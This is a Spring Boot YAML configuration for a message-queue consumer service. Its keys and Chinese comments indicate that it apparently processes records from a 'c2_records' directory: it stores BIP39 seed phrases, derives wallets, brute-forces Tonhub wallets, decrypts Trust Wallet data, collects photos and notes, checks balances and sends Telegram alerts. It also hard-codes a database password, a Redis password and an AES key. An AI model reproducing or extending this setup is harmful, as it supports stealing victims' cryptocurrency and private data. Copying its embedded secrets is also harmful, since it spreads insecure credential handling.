server:
  port: 8204
  max-http-header-size: 2MB
  connection-timeout: 10s
  tomcat:
    max-http-form-post-size: 50MB
    max-swallow-size: 10MB
    threads:
      max: 50
      min-spare: 5
    max-connections: 500
    accept-count: 100
  compression:
    enabled: true
    mime-types: application/json,application/xml,text/html,text/plain
    min-response-size: 1024

spring:
  application:
    name: 18-consumer-server
  cloud:
    nacos:
      discovery:
        server-addr: http://127.0.0.1:8848
        namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试
        #namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
  mvc:
    pathmatch:
      matching-strategy: ant_path_matcher
  servlet:
    multipart:
       max-file-size: 500MB
       max-request-size: 500MB
  jackson:
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8

  # spring-data-redis 自动配置用（RedisTemplate / RedisPush 依赖 Lettuce）
  redis:
    host: 127.0.0.1
    port: 6379
    password: 123456
    database: 0
    timeout: 5000ms
    lettuce:
      pool:
        max-active: 64    # 旁路 Lettuce；3 实例约 192
        max-idle: 32
        min-idle: 8
        max-wait: 5000ms
    # JedisPool（Stream 主路径）；3 实例 × 96 ≈ 288，需 Redis maxclients 足够
    jedis:
      pool:
        max-active: 96
        max-idle: 48
        min-idle: 12

  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
    #username: root
    #password: Root@123
    url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
    username: ioslianjie
    password: BAF4R22mwenXXxEH
    type: com.alibaba.druid.pool.DruidDataSource
    initialSize: 16
    minIdle: 16
    maxActive: 80        # 3×80=240；MySQL max_connections 建议 ≥500
    maxWait: 5000
    timeBetweenEvictionRunsMillis: 30000
    minEvictableIdleTimeMillis: 50000
    validationQuery: SELECT 1
    testWhileIdle: true
    testOnBorrow: false  # 关闭借出验证（testWhileIdle已保证连接可用），省~5-10ms/次DB操作
    testOnReturn: false
    connectionErrorRetryAttempts: 3
    breakAfterAcquireFailure: false

consumer:
  # 落盘根（同 API 进程 api18.upload-dir，war_unpack 读 .bin / Bip39Util 缓存用）
  #upload-dir: D:/c2_records
  upload-dir: /opt/news4/data/apilog
  # 解压 I/O+JSON：抬高以消化突发入队
  main-threads: 4
  # parse CPU 密：勿超过约 CPU/2；trust scrypt 已异步，可到 4
  parse-ci-threads: 4
  auto-claim-idle-ms: 1800000
  main-claim-idle-ms: 600000
  # 单条消息最大重试次数（含首次消费，超过进 DLQ）
  max-attempts: 5
  # 默认 1000ms → 第1次重试1s，第2次2s，第3次4s，第4次8s
  retry-backoff-base-ms: 1000
  # DLQ 消息最长保留毫秒（默认 7 天），超期自动清理
  dlq-retention-ms: 604800000
  # 助记词 AES 密钥：留空或空字符串 → mnemonic.result 明文入库
  mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey#news2"
  # 是否向 news4:tasks 投递 wallet_derive
  news4-task-enabled: true
  # 下游放大：1 parse ≈ 5 derive；突发时需明显大于 parse-ci-threads
  news4-threads: 12
  # 更勤拉取，减少 stream 堆积
  news4-poll-interval-ms: 300
  news4-claim-idle-ms: 600000
  photo-threads: 3
  photo-poll-interval-ms: 500
  photo-claim-idle-ms: 600000
  photo-batch-size: 16
  nb-notestore-threads: 3
  nb-notestore-poll-interval-ms: 800
  nb-notestore-claim-idle-ms: 900000
  nb-notestore-batch-size: 8
  #photo-dir: D:/c2_records/photos
  photo-dir: /opt/news4/data/photos
  photo-url-prefix: data/photos
  # 批量拉取：突发时一次多拿，减少 Redis 往返
  batch-size: 16
  parse-ci-batch-size: 8
  news4-batch-size: 24
  poll-interval-ms: 200
  parse-ci-poll-interval-ms: 400
  consumer-name:
  # tonhub：完全异步 + 串行化，避免并发打满 CPU
  tonhub-brute-sync-timeout-ms: 0
  tonhub-brute-threads: 0
  tonhub-brute-serialize: true
  # 每实例 1；3 实例合计最多 3 个 device 同时 tonhub 爆破
  tonhub-brute-serialize-permits: 1
  trust-decrypt-async: true
  trust-decrypt-threads: 2
  # 每实例 2；3 实例合计约 6 路 trust scrypt
  trust-decrypt-serialize-permits: 2
  # Poller 回压：worker 队列 ≥50% 停读，消息留 Stream 不丢
  poll-queue-high-ratio: 0.5
  # Trust/Tonhub 无许可时延迟重试（不永久跳过）
  crypto-defer-max-attempts: 120
  crypto-defer-base-delay-ms: 3000

# =============================================================================
# 【换另一套时必改】Redis 队列隔离（本机多套同 Redis 时防串消费）
# -----------------------------------------------------------------------------
# 同一套里下列服务必须改成一样：
#   18-ctwo-server / 18-device-server / 18-consumer-server  的 queue.*
# 推荐做法（只改一项即可隔离）：
#   queue.prefix: suite-a     → 实际 key 变成 suite-a:api18:tasks 等
#   另一套用 suite-b
# =============================================================================
queue:
  prefix: "suite-a"                          # 【换套改这里】例：suite-a / suite-b；
  stream-main: api18:tasks            # 主任务流（ctwo/device 生产，本服务消费）
  stream-parse-ci: api18:tasks:parse_ci
  stream-photo: api18:tasks:photo
  stream-nb-notestore: api18:tasks:nb_notestore
  stream-news4: news4:tasks           # wallet_derive 等
  group-main: api18-workers           # 消费组名也会带 prefix
  group-parse-ci: api18-parse-ci
  group-news4: news4-workers
  group-photo: api18-photo-workers
  group-nb-notestore: api18-nb-notestore
  dlq-main: api18:tasks:dead
  dlq-parse-ci: api18:tasks:parse_ci:dead
  dlq-news4: news4:tasks:dead
  dlq-photo: api18:tasks:photo:dead
  dlq-nb-notestore: api18:tasks:nb_notestore:dead

# news4 旁路线程池（与 n4-worker 隔离；listen / balance 互不堵塞）
news4:
  listen-pool:
    core-size: 8
    max-size: 16
    queue-capacity: 20000
  balance-pool:
    core-size: 8
    max-size: 24
    queue-capacity: 20000

#飞机消息线程池（突发时队列加大；并发仍限流防刷爆 TG）
telegram-msg-stream:
  async-pool:
    core-size: 4
    max-size: 12
    queue-capacity: 10000
    keep-alive-seconds: 60

